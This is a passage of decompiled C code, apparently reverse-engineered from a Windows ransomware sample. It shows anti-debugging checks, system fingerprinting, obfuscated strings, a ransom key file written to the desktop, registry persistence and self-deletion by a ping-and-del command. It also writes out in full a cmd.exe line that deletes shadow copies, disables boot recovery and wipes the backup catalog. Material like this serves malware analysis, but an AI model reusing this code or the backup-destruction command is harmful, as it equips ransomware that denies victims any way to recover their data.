  sub_40D080((char **)v123, v11, p_pbDebuggerPresent);
  if ( HIDWORD(v102) >= 0x10 )
  {
    v12 = Block[0];
    if ( (unsigned int)(HIDWORD(v102) + 1) >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_167;
      v13 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v13 >= Block[0] || (unsigned int)(Block[0] - v13) < 4 || (unsigned int)(Block[0] - v13) > 0x23 )
        goto LABEL_167;
      v12 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v12);
  }
  v102 = 0xF00000000i64;
  LOBYTE(Block[0]) = 0;
  if ( HIDWORD(v100) >= 0x10 )
  {
    v14 = ProcessInformation.hProcess;
    if ( (unsigned int)(HIDWORD(v100) + 1) >= 0x1000 )
    {
      if ( ((int)ProcessInformation.hProcess & 0x1F) != 0 )
        goto LABEL_167;
      v15 = (HANDLE)*((_DWORD *)ProcessInformation.hProcess - 1);
      if ( v15 >= ProcessInformation.hProcess
        || (unsigned int)(ProcessInformation.hProcess - v15) < 4
        || (unsigned int)(ProcessInformation.hProcess - v15) > 0x23 )
      {
        goto LABEL_167;
      }
      v14 = (HANDLE)*((_DWORD *)ProcessInformation.hProcess - 1);
    }
    j__free(v14);
  }
  v100 = 0xF00000000i64;
  LOBYTE(ProcessInformation.hProcess) = 0;
  if ( HIDWORD(v104) >= 0x10 )
  {
    v16 = *(void **)ValueName;
    if ( (unsigned int)(HIDWORD(v104) + 1) >= 0x1000 )
    {
      if ( (ValueName[0] & 0x1F) != 0 )
        goto LABEL_167;
      v17 = *(_DWORD *)(*(_DWORD *)ValueName - 4);
      if ( v17 >= *(_DWORD *)ValueName || *(_DWORD *)ValueName - v17 < 4 || *(_DWORD *)ValueName - v17 > 0x23 )
        goto LABEL_167;
      v16 = *(void **)(*(_DWORD *)ValueName - 4);
    }
    j__free(v16);
  }
  v104 = 0xF00000000i64;
  ValueName[0] = 0;
  sub_401D10((char **)ValueName, "InstallDate", 0xBu);
  v100 = 0xF00000000i64;
  LOBYTE(ProcessInformation.hProcess) = 0;
  sub_401D10((char **)&ProcessInformation, "EAEBBBUPHAgPHS03Iz4lLCU6GwcrICoiJCNkGgUNFTYxPCI+NhgrPyA5Kzo=", 0x3Cu);
  p_pbDebuggerPresent = ValueName;
  sub_402080(&v85, (int *)&ProcessInformation);
  v18 = (const CHAR *)sub_4021A0((_DWORD *)v85, (int)v86, v87, v88, v89, v90);
  sub_40D080((char **)v122, v18, p_pbDebuggerPresent);
  if ( HIDWORD(v102) >= 0x10 )
  {
    v19 = Block[0];
    if ( (unsigned int)(HIDWORD(v102) + 1) >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_167;
      v20 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v20 >= Block[0] || (unsigned int)(Block[0] - v20) < 4 || (unsigned int)(Block[0] - v20) > 0x23 )
        goto LABEL_167;
      v19 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v19);
  }
  v102 = 0xF00000000i64;
  LOBYTE(Block[0]) = 0;
  if ( HIDWORD(v100) >= 0x10 )
  {
    v21 = ProcessInformation.hProcess;
    if ( (unsigned int)(HIDWORD(v100) + 1) >= 0x1000 )
    {
      if ( ((int)ProcessInformation.hProcess & 0x1F) != 0 )
        goto LABEL_167;
      v22 = (HANDLE)*((_DWORD *)ProcessInformation.hProcess - 1);
      if ( v22 >= ProcessInformation.hProcess
        || (unsigned int)(ProcessInformation.hProcess - v22) < 4
        || (unsigned int)(ProcessInformation.hProcess - v22) > 0x23 )
      {
        goto LABEL_167;
      }
      v21 = (HANDLE)*((_DWORD *)ProcessInformation.hProcess - 1);
    }
    j__free(v21);
  }
  v100 = 0xF00000000i64;
  LOBYTE(ProcessInformation.hProcess) = 0;
  if ( HIDWORD(v104) >= 0x10 )
  {
    v23 = *(void **)ValueName;
    if ( (unsigned int)(HIDWORD(v104) + 1) >= 0x1000 )
    {
      if ( (ValueName[0] & 0x1F) != 0 )
        goto LABEL_167;
      v24 = *(_DWORD *)(*(_DWORD *)ValueName - 4);
      if ( v24 >= *(_DWORD *)ValueName || *(_DWORD *)ValueName - v24 < 4 || *(_DWORD *)ValueName - v24 > 0x23 )
        goto LABEL_167;
      v23 = *(void **)(*(_DWORD *)ValueName - 4);
    }
    j__free(v23);
  }
  v104 = 0xF00000000i64;
  ValueName[0] = 0;
  sub_401D10((char **)ValueName, "SystemBiosVersion", 0x11u);
  v100 = 0xF00000000i64;
  LOBYTE(ProcessInformation.hProcess) = 0;
  sub_401D10((char **)&ProcessInformation, "Cw8VFBUPHAgPFAEHEgMfExcHCB4eHTc+JzUp", 0x24u);
  p_pbDebuggerPresent = ValueName;
  sub_402080(&v85, (int *)&ProcessInformation);
  v25 = (const CHAR *)sub_4021A0((_DWORD *)v85, (int)v86, v87, v88, v89, v90);
  sub_40D080((char **)v121, v25, p_pbDebuggerPresent);
  if ( HIDWORD(v102) >= 0x10 )
  {
    v26 = Block[0];
    if ( (unsigned int)(HIDWORD(v102) + 1) >= 0x1000 )
    {
      if ( ((int)Block[0] & 0x1F) != 0 )
        goto LABEL_167;
      v27 = (void *)*((_DWORD *)Block[0] - 1);
      if ( v27 >= Block[0] || (unsigned int)(Block[0] - v27) < 4 || (unsigned int)(Block[0] - v27) > 0x23 )
        goto LABEL_167;
      v26 = (void *)*((_DWORD *)Block[0] - 1);
    }
    j__free(v26);
  }
  v102 = 0xF00000000i64;
  LOBYTE(Block[0]) = 0;
  if ( HIDWORD(v100) >= 0x10 )
  {
    v28 = ProcessInformation.hProcess;
    if ( (unsigned int)(HIDWORD(v100) + 1) >= 0x1000 )
    {
      if ( ((int)ProcessInformation.hProcess & 0x1F) != 0 )
        goto LABEL_167;
      v29 = (HANDLE)*((_DWORD *)ProcessInformation.hProcess - 1);
      if ( v29 >= ProcessInformation.hProcess
        || (unsigned int)(ProcessInformation.hProcess - v29) < 4
        || (unsigned int)(ProcessInformation.hProcess - v29) > 0x23 )
      {
        goto LABEL_167;
      }
      v28 = (HANDLE)*((_DWORD *)ProcessInformation.hProcess - 1);
    }
    j__free(v28);
  }
  v100 = 0xF00000000i64;
  LOBYTE(ProcessInformation.hProcess) = 0;
  if ( HIDWORD(v104) >= 0x10 )
  {
    v30 = *(void **)ValueName;
    if ( (unsigned int)(HIDWORD(v104) + 1) >= 0x1000 )
    {
      if ( (ValueName[0] & 0x1F) != 0 )
        goto LABEL_167;
      v31 = *(_DWORD *)(*(_DWORD *)ValueName - 4);
      if ( v31 >= *(_DWORD *)ValueName || *(_DWORD *)ValueName - v31 < 4 || *(_DWORD *)ValueName - v31 > 0x23 )
        goto LABEL_167;
      v30 = *(void **)(*(_DWORD *)ValueName - 4);
    }
    j__free(v30);
  }
  v32 = v124;
  p_pbDebuggerPresent = (char *)v124[4];
  if ( v125 >= 0x10 )
    v32 = (void **)v124[0];
  sub_4036D0(v113, v32, (size_t)p_pbDebuggerPresent);
  v33 = v123;
  p_pbDebuggerPresent = (char *)v123[4];
  if ( v123[5] >= (void *)0x10 )
    v33 = (void **)v123[0];
  sub_4036D0(v113, v33, (size_t)p_pbDebuggerPresent);
  v34 = v122;
  p_pbDebuggerPresent = (char *)v122[4];
  if ( v122[5] >= (void *)0x10 )
    v34 = (void **)v122[0];
  sub_4036D0(v113, v34, (size_t)p_pbDebuggerPresent);
  v35 = v121;
  p_pbDebuggerPresent = (char *)v121[4];
  if ( v121[5] >= (void *)0x10 )
    v35 = (void **)v121[0];
  sub_4036D0(v113, v35, (size_t)p_pbDebuggerPresent);
  sub_4036D0(v113, Buffer, strlen(Buffer));
  VolumeSerialNumber = 0;
  GetVolumeInformationA("c:\\", 0, 0, &VolumeSerialNumber, 0, 0, 0, 0);
  sub_401B40((char *)v113, VolumeSerialNumber);
  sub_401A10(Src, v113);
  sub_411290(&StartupInfo, (char *)Src);
  sub_411B80(&StartupInfo, (char **)v110);
  if ( v115 >= 0x10 )
  {
    v36 = Src[0];
    if ( v115 + 1 >= 0x1000 )
    {
      if ( ((int)Src[0] & 0x1F) != 0 )
        goto LABEL_167;
      v37 = (void *)*((_DWORD *)Src[0] - 1);
      if ( v37 >= Src[0] || (unsigned int)(Src[0] - v37) < 4 || (unsigned int)(Src[0] - v37) > 0x23 )
        goto LABEL_167;
      v36 = (void *)*((_DWORD *)Src[0] - 1);
    }
    j__free(v36);
  }
  sub_401A10(Block, v110);
  v38 = (const CHAR *)unknown_libname_5(v102 + 1);
  v39 = HIDWORD(v102);
  v40 = Block;
  v41 = Block[0];
  lpName = v38;
  if ( HIDWORD(v102) >= 0x10 )
    v40 = (void **)Block[0];
  v42 = v38 - (const CHAR *)v40;
  do
  {
    v43 = *(_BYTE *)v40;
    v40 = (void **)((char *)v40 + 1);
    *((_BYTE *)v40 + v42 - 1) = v43;
  }
  while ( v43 );
  MutexA = CreateMutexA(0, 0, lpName);
  if ( WaitForSingleObject(MutexA, 0) )
  {
    _loaddll(0);
    goto LABEL_167;
  }
  if ( v39 < 0x10 )
    goto LABEL_125;
  if ( v39 + 1 >= 0x1000 )
  {
    if ( ((int)Block[0] & 0x1F) != 0
      || (v41 = (void *)*((_DWORD *)Block[0] - 1), v41 >= Block[0])
      || (unsigned int)(Block[0] - v41) < 4
      || (unsigned int)(Block[0] - v41) > 0x23 )
    {
LABEL_167:
      _invalid_parameter_noinfo_noreturn();
    }
  }
  j__free(v41);
LABEL_125:
  if ( IsDebuggerPresent() )
  {
    _loaddll(0);
LABEL_169:
    _loaddll(0);
    goto LABEL_170;
  }
  pbDebuggerPresent = 0;
  p_pbDebuggerPresent = (char *)&pbDebuggerPresent;
  CurrentProcess = GetCurrentProcess();
  if ( CheckRemoteDebuggerPresent(CurrentProcess, (PBOOL)p_pbDebuggerPresent) && pbDebuggerPresent )
    goto LABEL_169;
  if ( sub_4017D0() )
  {
LABEL_170:
    _loaddll(0);
    goto LABEL_171;
  }
  v102 = 0xF00000000i64;
  LOBYTE(Block[0]) = 0;
  sub_401D10((char **)Block, "ECEhJDUvPCgPAyUgJCM4bg==", 0x18u);
  p_pbDebuggerPresent = (char *)v110;
  sub_402080(&v85, (int *)Block);
  v46 = (char **)sub_4021A0((_DWORD *)v85, (int)v86, v87, v88, v89, v90);
  sub_40C470((int)Src, v46, (size_t **)p_pbDebuggerPresent);
  sub_401970((char **)&pExplicitAccess);
  sub_401970((char **)Block);
  v47 = (const CHAR *)unknown_libname_5((char *)Src[4] + 1);
  v48 = Src;
  v49 = v47;
  lpSubKey = v47;
  if ( v115 >= 0x10 )
    v48 = (void **)Src[0];
  v50 = v47 - (const CHAR *)v48;
  do
  {
    v51 = *(_BYTE *)v48;
    v48 = (void **)((char *)v48 + 1);
    *((_BYTE *)v48 + v50 - 1) = v51;
  }
  while ( v51 );
  v52 = RegOpenKeyExA(HKEY_CURRENT_USER, v49, 0, 0xF003Fu, &phkResult);
  p_pbDebuggerPresent = 0;
  if ( v52 != 2 )
  {
LABEL_171:
    _loaddll(p_pbDebuggerPresent);
    JUMPOUT(0x40EA4E);
  }
  sub_409E40(v116, 8u, (char)p_pbDebuggerPresent);
  v53 = v116;
  v54 = 8;
  if ( v117 >= 0x10 )
    v53 = (char **)v116[0];
  do
  {
    strcpy((char *)&pExplicitAccess, "0123456789abcdefghijklmnopqrstuvwxyz");
    v53 = (char **)((char *)v53 + 1);
    *((_BYTE *)v53 - 1) = *((_BYTE *)&pExplicitAccess.cbSize + rand() % 0x24u);
    --v54;
  }
  while ( v54 );
  sub_401A10(&v86, v116);
  sub_40D2D0(v86, v87, v88, v89, v90, (unsigned int)p_pbDebuggerPresent);
  v55 = GetCurrentProcess();
  memset(&pExplicitAccess, 0, 32);
  BuildExplicitAccessWithNameA((PEXPLICIT_ACCESS_A)&pExplicitAccess, (LPSTR)"CURRENT_USER", 0x401FFFFFu, DENY_ACCESS, 0);
  lpName = 0;
  SetEntriesInAclA(1u, (PEXPLICIT_ACCESS_A)&pExplicitAccess, 0, (PACL *)&lpName);
  SetSecurityInfo(v55, SE_KERNEL_OBJECT, 4u, 0, 0, (PACL)lpName, 0);
  LocalFree((HLOCAL)lpName);
  CloseHandle(v55);
  v120[4] = 0;
  v120[5] = (char *)15;
  LOBYTE(v120[0]) = 0;
  sub_401D10(v120, "ISVOLUMESHADOWS", 0xFu);
  if ( sub_401F20((int *)v120, (int)"YESVOLUMESHADOW") )
    goto LABEL_138;
  v56 = 0;
  p_pbDebuggerPresent = (char *)&lpName;
  v90 = 8;
  lpName = 0;
  v57 = GetCurrentProcess();
  if ( OpenProcessToken(v57, v90, (PHANDLE)p_pbDebuggerPresent) )
  {
    ReturnLength = 4;
    if ( GetTokenInformation((HANDLE)lpName, TokenElevation, &TokenInformation, 4u, &ReturnLength) )
      v56 = TokenInformation;
  }
  if ( lpName )
    CloseHandle((HANDLE)lpName);
  if ( v56 )
  {
LABEL_138:
    sub_40D1F0();
  }
  else
  {
    pExplicitAccess.cbSize = 60;
    pExplicitAccess.fMask = 0;
    pExplicitAccess.hwnd = 0;
    pExplicitAccess.lpVerb = "open";
    pExplicitAccess.lpFile = "cmd.exe";
    pExplicitAccess.lpParameters = "/C vssadmin.exe delete shadows /all /quiet & wmic.exe shadowcopy delete & bcdedit /se"
                                   "t {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabl"
                                   "ed no & wbadmin delete catalog -quiet";
    memset(&pExplicitAccess.lpDirectory, 0, 12);
    ShellExecuteExA(&pExplicitAccess);
  }
  v58 = sub_40D260();
  v59 = sub_40D260();
  TokenInformation = sub_40D260();
  ReturnLength = sub_40D260();
  lpName = (LPCSTR)sub_40D260();
  v93 = sub_40D260();
  v94 = sub_40D260();
  v95 = sub_40D260();
  phkResult = (HKEY)sub_40D260();
  pExplicitAccess.lpFile = 0;
  pExplicitAccess.lpParameters = (LPCSTR)15;
  LOBYTE(pExplicitAccess.cbSize) = 0;
  memset(v126, 0, sizeof(v126));
  v126[0] = (int)&unk_442324;
  v126[4] = (int)&unk_44236C;
  v126[26] = (int)&std::ios::`vftable';
  sub_40BD50(v126, (int)&v126[6], (int)p_pbDebuggerPresent);
  *(int *)((char *)v126 + *(_DWORD *)(v126[0] + 4)) = (int)&std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable';
  *(int *)((char *)&v126[-1] + *(_DWORD *)(v126[0] + 4)) = *(_DWORD *)(v126[0] + 4) - 104;
  sub_40C000(&v126[6]);
  v126[6] = (int)&std::stringbuf::`vftable';
  v126[20] = 0;
  v126[21] = 0;
  sub_40F1D0((char *)&v126[4], v58);
  sub_40F1D0((char *)&v126[4], v59);
  sub_40F1D0((char *)&v126[4], TokenInformation);
  sub_40F1D0((char *)&v126[4], ReturnLength);
  sub_40F1D0((char *)&v126[4], (int)lpName);
  sub_40F1D0((char *)&v126[4], v93);
  sub_40F1D0((char *)&v126[4], v94);
  sub_40F1D0((char *)&v126[4], v95);
  sub_40F1D0((char *)&v126[4], (int)phkResult);
  if ( (v126[21] & 2) != 0 || !*(_DWORD *)v126[14] )
  {
    if ( (v126[21] & 4) != 0 || (v62 = *(_DWORD *)v126[13]) == 0 )
    {
      ValueName[0] = 0;
      v104 = 0xF00000000i64;
      *(_OWORD *)Block = *(_OWORD *)ValueName;
      v102 = 0xF00000000i64;
    }
    else
    {
      v63 = *(void **)v126[9];
      v64 = *(_DWORD *)v126[17] - *(_DWORD *)v126[9];
      v104 = 0xF00000000i64;
      ValueName[0] = 0;
      sub_401D10((char **)ValueName, v63, v62 + v64);
      *(_OWORD *)Block = *(_OWORD *)ValueName;
      v102 = v104;
      v104 = 0xF00000000i64;
      ValueName[0] = 0;
      sub_401970((char **)ValueName);
    }
  }
  else
  {
    v60 = v126[20];
    if ( v126[20] < *(_DWORD *)v126[14] )
      v60 = *(_DWORD *)v126[14];
    v61 = *(void **)v126[10];
    p_pbDebuggerPresent = (char *)(v60 - *(_DWORD *)v126[10]);
    v100 = 0xF00000000i64;
    LOBYTE(ProcessInformation.hProcess) = 0;
    sub_401D10((char **)&ProcessInformation, v61, (size_t)p_pbDebuggerPresent);
    *(struct _PROCESS_INFORMATION *)Block = ProcessInformation;
    v102 = v100;
    v100 = 0xF00000000i64;
    LOBYTE(ProcessInformation.hProcess) = 0;
    sub_401970((char **)&ProcessInformation);
  }
  sub_403490((char **)&pExplicitAccess, (char **)Block);
  sub_401970((char **)Block);
  sub_401A10(&v86, &pExplicitAccess);
  sub_412400((int)v127, (int)&savedregs, v86, v87, v88, v89, v90, (unsigned int)p_pbDebuggerPresent);
  sub_401A10(&v86, v110);
  sub_401A10(&v80, v127);
  sub_4082E0(
    (int)&savedregs,
    v59,
    v58,
    (unsigned int)v80,
    v81,
    v82,
    v83,
    v84,
    v85,
    (unsigned int)v86,
    v87,
    v88,
    v89,
    v90,
    (unsigned int)p_pbDebuggerPresent);
  sub_411C30();
  sub_40D4F0();
  memset(pszPath, 0, 0x104u);
  SHGetSpecialFolderPathA(0, pszPath, 16, 0);
  v102 = 0xF00000000i64;
  LOBYTE(Block[0]) = 0;
  sub_40C620((char **)Block, v111 + 6);
  sub_4036D0((char **)Block, "\\#KEY-", 6u);
  v65 = v110;
  p_pbDebuggerPresent = (char *)v111;
  if ( v112 >= 0x10 )
    v65 = (void **)v110[0];
  sub_4036D0((char **)Block, v65, (size_t)p_pbDebuggerPresent);
  v66 = sub_4036D0((char **)Block, ".KEY", 4u);
  v119 = 0i64;
  *(_OWORD *)Source = *(_OWORD *)v66;
  v119 = *((_QWORD *)v66 + 2);
  v66[4] = 0;
  v66[5] = (char *)15;
  *(_BYTE *)v66 = 0;
  sub_401970((char **)Block);
  v67 = (const char *)Source;
  if ( HIDWORD(v119) >= 0x10 )
    v67 = Source[0];
  strcat_s(pszPath, 0x104u, v67);
  operator new(1u);
  sub_401A10(&v86, v110);
  v84 = 0;
  v85 = 15;
  LOBYTE(v80) = 0;
  sub_401D10(&v80, pszPath, strlen(pszPath));
  sub_401A10(v79, v127);
  sub_407400(
    (int)&savedregs,
    v79[0],
    (int)v79[1],
    (int)v79[2],
    (int)v79[3],
    (size_t)v79[4],
    (unsigned int)v79[5],
    v80,
    v81,
    v82,
    v83,
    v84,
    v85,
    v86,
    v87,
    v88,
    v89,
    v90,
    (unsigned int)p_pbDebuggerPresent);
  v68 = lpSubKey;
  v69 = (char *)RegOpenKeyExA(HKEY_CURRENT_USER, lpSubKey, 0, 0xF003Fu, &phkResult);
  if ( v69 == (char *)2 )
  {
    v71 = sub_410910((char *)dword_452990, "Creating registry key: ");
    v72 = sub_410910(v71, v68);
    sub_410BB0(v72);
    v69 = (char *)RegCreateKeyExA(HKEY_CURRENT_USER, v68, 0, 0, 0, 0xF003Fu, 0, &phkResult, 0);
  }
  if ( v69 )
  {
    p_pbDebuggerPresent = v69;
    v90 = v70;
    v73 = sub_410910((char *)dword_452990, "Error: ");
    v74 = sub_40F1D0(v73, (int)p_pbDebuggerPresent);
    v75 = sub_410910(v74, " Could not find or create ");
    v76 = sub_410910(v75, v68);
    sub_410BB0(v76);
  }
  memset(FileName, 0, 0x104u);
  SHGetSpecialFolderPathA(0, FileName, 7, 0);
  strcat_s(FileName, 0x104u, "\\");
  v77 = (const char *)v116;
  if ( v117 >= 0x10 )
    v77 = v116[0];
  strcat_s(FileName, 0x104u, v77);
  strcat_s(FileName, 0x104u, ".lnk");
  DeleteFileA(FileName);
  memset(&StartupInfo, 0, sizeof(StartupInfo));
  ProcessInformation = 0i64;
  GetModuleFileNameA(0, Filename, 0x104u);
  sub_40CFF0(CommandLine, 520, (int)"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"", (int)Filename);
  CreateProcessA(0, (LPSTR)CommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation);
  CloseHandle(ProcessInformation.hThread);
  CloseHandle(ProcessInformation.hProcess);
  sub_401970(Source);
  sub_401970(v127);
  sub_40EA50(v126);
  sub_401970((char **)&pExplicitAccess);
  sub_401970(v120);
  sub_401970(v116);
  sub_401970((char **)Src);
  sub_401970((char **)v110);
  sub_401970((char **)v121);
  sub_401970((char **)v122);
  sub_401970((char **)v123);
  sub_401970((char **)v124);
  sub_401970(v113);
  return 0;
}
// 40EA49: control flows out of bounds to 40EA4E
// 40E818: variable 'v70' is possibly undefined
// 414B29: using guessed type int __cdecl unknown_libname_5(_DWORD);
// 436068: using guessed type void *std::ios::`vftable';
// 442378: using guessed type void *std::stringbuf::`vftable';
// 4423B8: using guessed type void *std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable';
// 452990: using guessed type int dword_452990[5];
// 40D5A0: using guessed type int CommandLine[131];

//----- (0040EA50) --------------------------------------------------------
void __thiscall sub_40EA50(_BYTE *this)
{
  struct std::ios_base *v1; // esi

  v1 = (struct std::ios_base *)(this + 104);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 104) = &std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*(_DWORD *)this + 4) - 108) = *(_DWORD *)(*(_DWORD *)this + 4) - 104;
  sub_40F0B0(this + 24);
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 104) = &std::iostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 32;
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 22) + 4) - 88) = &std::ostream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 22) + 4) - 92) = *(_DWORD *)(*((_DWORD *)v1 - 22) + 4) - 8;
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 104) = &std::istream::`vftable';
  *(_DWORD *)((char *)v1 + *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 108) = *(_DWORD *)(*((_DWORD *)v1 - 26) + 4) - 24;
  *(_DWORD *)v1 = &std::ios_base::`vftable';
  std::ios_base::_Ios_base_dtor(v1);
}
// 435FE0: using guessed type void *std::ios_base::`vftable';
// 436070: using guessed type void *std::ostream::`vftable';
// 442338: using guessed type void *std::iostream::`vftable';
// 442350: using guessed type void *std::istream::`vftable';
// 4423B8: using guessed type void *std::basic_stringstream<char,std::char_traits<char>,std::allocator<char>>::`vftable';

//----- (0040EB10) --------------------------------------------------------
int __thiscall sub_40EB10(int this, int a2, __int64 a3, __int64 a4, int a5, int a6, char a7)
{
  int v7; // ebx
  int v8; // esi
  unsigned int *v10; // edx
  unsigned int v11; // eax
  int v12; // ecx
  int v13; // ecx
  int v14; // edx
  int v15; // ecx
  int v16; // ecx
  int v17; // ecx
  int result; // eax
  int v19; // [esp+Ch] [ebp-Ch]
  int v20; // [esp+Ch] [ebp-Ch]

  v7 = (unsigned __int64)(a4 + a3) >> 32;
  v8 = a4 + a3;
  v10 = *(unsigned int **)(this + 32);
  v11 = *v10;
  if ( *v10 && *(_DWORD *)(this + 56) < v11 )
    *(_DWORD *)(this + 56) = v11;
  if ( v8 != -1 || v7 != -1 )
  {
    if ( (a7 & 1) != 0 && (v19 = **(_DWORD **)(this + 28)) != 0 )
    {
      if ( v7 >= 0 )
      {
        v12 = **(_DWORD **)(this + 12);
        if ( __SPAIR64__(v7, v8) <= *(_DWORD *)(this + 56) - v12 )
        {
          v13 = v8 + v12 - v19;
          **(_DWORD **)(this + 44) -= v13;
          **(_DWORD **)(this + 28) += v13;
          if ( (a7 & 2) != 0 )
          {
            v20 = **(_DWORD **)(this + 32);
            if ( v20 )
            {
              v14 = **(_DWORD **)(this + 28);
              v15 = v20 + **(_DWORD **)(this + 48) - v14;
              **(_DWORD **)(this + 32) = v14;
              **(_DWORD **)(this + 48) = v15;
            }
          }
          goto LABEL_21;
        }
      }
    }
    else
    {
      if ( (a7 & 2) == 0 || !*v10 )
      {
        v7 = -1;
        goto LABEL_20;
      }
      if ( v7 >= 0 )
      {
        v16 = **(_DWORD **)(this + 12);
        if ( __SPAIR64__(v7, v8) <= *(_DWORD *)(this + 56) - v16 )
        {
          v17 = v8 + v16 - **(_DWORD **)(this + 32);
          **(_DWORD **)(this + 48) -= v17;
          **(_DWORD **)(this + 32) += v17;
          goto LABEL_21;
        }
      }
    }
    v7 = -1;
LABEL_20:
    v8 = -1;
  }
LABEL_21:
  result = a2;
  *(_DWORD *)a2 = v8;
  *(_DWORD *)(a2 + 4) = v7;
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = 0;
  *(_QWORD *)(a2 + 16) = 0i64;
  return result;
}

//----- (0040EC50) --------------------------------------------------------
int __thiscall sub_40EC50(int this, int a2, __int64 a3, int a4, char a5)
{
  unsigned int *v6; // edx
  unsigned int v7; // eax
  int v8; // esi
  int v9; // edi
  int v10; // esi
  int v11; // ecx
  int v12; // ecx
  int v13; // edx
  int v14; // ecx
  unsigned int v15; // edx
  int v16; // ecx
  int v17; // ecx
  int result; // eax
  int v19; // [esp+Ch] [ebp-4h]
  int v20; // [esp+28h] [ebp+18h]

  v6 = *(unsigned int **)(this + 32);
  v7 = *v6;
  if ( *v6 && *(_DWORD *)(this + 56) < v7 )
    *(_DWORD *)(this + 56) = v7;
  if ( (a5 & 1) == 0 || (v8 = **(_DWORD **)(this + 28), (v19 = v8) == 0) )
  {
    if ( (a5 & 2) != 0 && (v15 = *v6) != 0 )
    {
      if ( a4 == 2 )
      {
        v9 = (unsigned __int64)(*(_DWORD *)(this + 56) - **(_DWORD **)(this + 12) + a3) >> 32;
        v10 = *(_DWORD *)(this + 56) - **(_DWORD **)(this + 12) + a3;
      }
      else if ( a4 == 1 )
      {
        v9 = (unsigned __int64)((int)(v15 - **(_DWORD **)(this + 12)) + a3) >> 32;
        v10 = v15 - **(_DWORD **)(this + 12) + a3;
      }
      else if ( a4 )
      {
        v10 = -1;
        v9 = -1;
      }
      else
      {
        v9 = HIDWORD(a3);
        v10 = a3;
      }
      if ( v9 >= 0 )
      {
        v16 = **(_DWORD **)(this + 12);
        if ( __SPAIR64__(v9, v10) <= *(_DWORD *)(this + 56) - v16 )
        {
          v17 = v10 + v16 - v15;
          **(_DWORD **)(this + 48) -= v17;
          **(_DWORD **)(this + 32) += v17;
          goto LABEL_33;
        }
      }
    }
    else
    {
      v9 = HIDWORD(a3);
      v10 = a3;
      if ( !a3 )
        goto LABEL_33;
    }
LABEL_32:
    v10 = -1;
    v9 = -1;
    goto LABEL_33;
  }
  if ( a4 != 2 )
  {
    if ( a4 == 1 )
    {
      if ( (a5 & 2) == 0 )
      {
        v9 = (unsigned __int64)(v8 - **(_DWORD **)(this + 12) + a3) >> 32;
        v10 = v8 - **(_DWORD **)(this + 12) + a3;
        goto LABEL_14;
      }
    }
    else if ( !a4 )
    {
      v9 = HIDWORD(a3);
      v10 = a3;
      goto LABEL_14;
    }
    v10 = -1;
    v9 = -1;
    goto LABEL_14;
  }
  v9 = (unsigned __int64)(*(_DWORD *)(this + 56) - **(_DWORD **)(this + 12) + a3) >> 32;
  v10 = *(_DWORD *)(this + 56) - **(_DWORD **)(this + 12) + a3;
LABEL_14:
  if ( v9 < 0 )
    goto LABEL_32;
  v11 = **(_DWORD **)(this + 12);
  if ( __SPAIR64__(v9, v10) > *(_DWORD *)(this + 56) - v11 )
    goto LABEL_32;
  v12 = v10 + v11 - v19;
  **(_DWORD **)(this + 44) -= v12;
  **(_DWORD **)(this + 28) += v12;
  if ( (a5 & 2) != 0 )
  {
    v20 = **(_DWORD **)(this + 32);
    if ( v20 )
    {
      v13 = **(_DWORD **)(this + 28);
      v14 = v20 + **(_DWORD **)(this + 48) - v13;
      **(_DWORD **)(this + 32) = v13;
      **(_DWORD **)(this + 48) = v14;
    }
  }
LABEL_33:
  result = a2;
  *(_DWORD *)(a2 + 4) = v9;
  *(_DWORD *)a2 = v10;
  *(_DWORD *)(a2 + 8) = 0;
  *(_DWORD *)(a2 + 12) = 0;
  *(_QWORD *)(a2 + 16) = 0i64;
  return result;
}

//----- (0040EE20) --------------------------------------------------------
int __thiscall sub_40EE20(int this)
{
  unsigned __int8 **v1; // esi
  unsigned __int8 *v2; // edx
  _DWORD *v4; // edi
  unsigned int v5; // eax

  v1 = *(unsigned __int8 ***)(this + 28);
  v2 = *v1;
  if ( !*v1 )
    return -1;
  v4 = *(_DWORD **)(this + 44);
  if ( v2 < &v2[*v4] )
    return *v2;
  if ( (*(_BYTE *)(this + 60) & 4) != 0 )
    return -1;
  v5 = **(_DWORD **)(this + 32);
  if ( !v5 || v5 <= (unsigned int)v2 && *(_DWORD *)(this + 56) <= (unsigned int)v2 )
    return -1;
  if ( *(_DWORD *)(this + 56) < v5 )
    *(_DWORD *)(this + 56) = v5;
  *v4 = *(_DWORD *)(this + 56) - (_DWORD)*v1;
  return ***(unsigned __int8 ***)(this + 28);
}

//----- (0040EE80) --------------------------------------------------------
int __thiscall sub_40EE80(int this, int a2)
{
  unsigned int v2; // esi
  int v3; // edx

  v2 = **(_DWORD **)(this + 28);
  if ( !v2 )
    return -1;
  if ( v2 <= **(_DWORD **)(this + 12) )
    return -1;
  v3 = a2;
  if ( a2 != -1 && (_BYTE)a2 != *(_BYTE *)(v2 - 1) && (*(_BYTE *)(this + 60) & 2) != 0 )
    return -1;
  ++**(_DWORD **)(this + 44);
  --**(_DWORD **)(this + 28);
  if ( a2 == -1 )
    return 0;
  ***(_BYTE ***)(this + 28) = a2;
  return v3;
}

